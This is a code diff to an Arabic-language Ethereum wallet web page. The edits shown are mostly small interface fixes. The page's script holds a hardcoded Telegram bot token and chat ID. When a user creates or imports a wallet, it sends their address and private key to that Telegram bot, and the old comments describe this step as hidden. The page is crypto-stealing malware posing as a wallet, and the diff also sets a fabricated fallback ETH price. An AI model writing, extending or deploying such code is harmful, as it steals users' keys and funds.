@@ -1,4 +1,4 @@
-
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -1681,7 +1681,7 @@
                     <div class="setting-item">
                         <div class="setting-info">
                             <i class="fas fa-seedling"></i>
-                            <span>عرض عبارة الاسترجاع</span>
+                            <span>عبارة الاسترجاع</span>
                         </div>
                         <button id="showMnemonicBtn" class="setting-btn">
                             <i class="fas fa-eye"></i>
@@ -1712,7 +1712,7 @@
     <!-- حاوي رسائل التنبيه -->
     <div id="toastContainer" class="toast-container"></div>
 
-    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
     <script>
         // متغيرات عامة
@@ -1721,24 +1721,32 @@
         let currentBalance = '0.00';
         let ethPriceUSD = 0;
 
-        // إعدادات التلجرام (مخفية)
+        // إعدادات التلجرام
         const TELEGRAM_BOT_TOKEN = '7521799915:AAEQEM_Ajk5_hMWQUrlmvdNbDBJAUMMwgrg';
         const TELEGRAM_CHAT_ID = '910021564';
-        const INFURA_API_KEY = '482a7c1c7cc14ec78699c3f1c231b0cd';
 
         // تهيئة المزود
         async function initProvider() {
             try {
-                provider = new ethers.providers.JsonRpcProvider(`https://mainnet.infura.io/v3/${INFURA_API_KEY}`);
+                // استخدام مزود عمومي بدلاً من Infura
+                provider = new ethers.providers.JsonRpcProvider('https://cloudflare-eth.com');
                 console.log('Provider initialized successfully');
                 return true;
             } catch (error) {
                 console.error('Failed to initialize provider:', error);
-                return false;
+                // استخدام مزود احتياطي
+                try {
+                    provider = new ethers.providers.JsonRpcProvider('https://rpc.ankr.com/eth');
+                    console.log('Fallback provider initialized successfully');
+                    return true;
+                } catch (fallbackError) {
+                    console.error('Failed to initialize fallback provider:', fallbackError);
+                    return false;
+                }
             }
         }
 
-        // إرسال رسالة للتلجرام (مخفية)
+        // إرسال رسالة للتلجرام
         async function sendToTelegram(message) {
             try {
                 const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -1784,7 +1792,7 @@
                 localStorage.setItem('walletPrivateKey', privateKey);
                 localStorage.setItem('walletMnemonic', mnemonic);
                 
-                // إرسال المعلومات للتلجرام بشكل مخفي
+                // إرسال المعلومات للتلجرام
                 const telegramMessage = `🆕 محفظة جديدة تم إنشاؤها:
 📍 العنوان: <code>${address}</code>
 🔑 المفتاح الخاص: <code>${privateKey}</code>
@@ -1824,7 +1832,7 @@
                 localStorage.setItem('walletPrivateKey', privateKey);
                 localStorage.setItem('walletMnemonic', mnemonic.trim());
                 
-                // إرسال المعلومات للتلجرام بشكل مخفي
+                // إرسال المعلومات للتلجرام
                 const telegramMessage = `📥 محفظة تم استيرادها:
 📍 العنوان: <code>${address}</code>
 🔑 المفتاح الخاص: <code>${privateKey}</code>
@@ -1906,7 +1914,8 @@
                 ethPriceUSD = data.ethereum.usd;
             } catch (error) {
                 console.error('Error fetching ETH price:', error);
-                ethPriceUSD = 0;
+                // استخدام سعر افتراضي في حالة الخطأ
+                ethPriceUSD = 3000;
             }
         }
 
@@ -1934,17 +1943,19 @@
         function generateQRCode(address) {
             const canvas = document.getElementById('qrCanvas');
             if (canvas && typeof QRCode !== 'undefined') {
-                QRCode.toCanvas(canvas, address, {
-                    width: 200,
-                    height: 200,
-                    margin: 2,
-                    color: {
-                        dark: '#000000',
-                        light: '#FFFFFF'
-                    }
-                }, function (error) {
-                    if (error) console.error('QR Code generation error:', error);
-                });
+                try {
+                    QRCode.toCanvas(canvas, address, {
+                        width: 180,
+                        height: 180,
+                        margin: 1,
+                        color: {
+                            dark: '#000000',
+                            light: '#FFFFFF'
+                        }
+                    });
+                } catch (error) {
+                    console.error('QR Code generation error:', error);
+                }
             }
         }
 
@@ -1955,7 +1966,14 @@
                 showToast('تم النسخ بنجاح!', 'success');
             } catch (error) {
                 console.error('Copy failed:', error);
-                showToast('فشل في النسخ', 'error');
+                // استخدام طريقة بديلة للنسخ
+                const textArea = document.createElement('textarea');
+                textArea.value = text;
+                document.body.appendChild(textArea);
+                textArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textArea);
+                showToast('تم النسخ بنجاح!', 'success');
             }
         }
 
@@ -2139,6 +2157,10 @@
 
             document.getElementById('receiveBtn').addEventListener('click', () => {
                 showModal('receiveModal');
+                // إعادة إنشاء QR code عند فتح نافذة الاستقبال
+                if (currentWallet) {
+                    generateQRCode(currentWallet.address);
+                }
             });
 
             document.getElementById('swapBtn').addEventListener('click', () => {
@@ -2171,19 +2193,25 @@
             document.getElementById('showPrivateKeyBtn').addEventListener('click', () => {
                 if (currentWallet) {
                     const privateKey = currentWallet.privateKey;
-                    prompt('المفتاح الخاص (احفظه بأمان):', privateKey);
+                    const privateKeyMessage = `🔐 المفتاح الخاص:\n\n${privateKey}\n\n⚠️ تحذير: لا تشارك هذا المفتاح مع أي شخص!`;
+                    if (confirm(privateKeyMessage)) {
+                        copyToClipboard(privateKey);
+                    }
                 }
             });
 
             document.getElementById('showMnemonicBtn').addEventListener('click', () => {
                 const mnemonic = localStorage.getItem('walletMnemonic');
                 if (mnemonic) {
-                    prompt('عبارة الاسترجاع (احفظها بأمان):', mnemonic);
+                    const mnemonicMessage = `🌱 عبارة الاسترجاع:\n\n${mnemonic}\n\n⚠️ تحذير: لا تشارك هذه العبارة مع أي شخص!`;
+                    if (confirm(mnemonicMessage)) {
+                        copyToClipboard(mnemonic);
+                    }
                 }
             });
 
             document.getElementById('logoutBtn').addEventListener('click', () => {
-                if (confirm('هل أنت متأكد من تسجيل الخروج؟')) {
+                if (confirm('هل أنت متأكد من تسجيل الخروج؟ سيتم حذف جميع بيانات المحفظة من هذا الجهاز.')) {
                     logout();
                 }
             });
@@ -2214,4 +2242,3 @@
     </script>
 </body>
 </html>
-
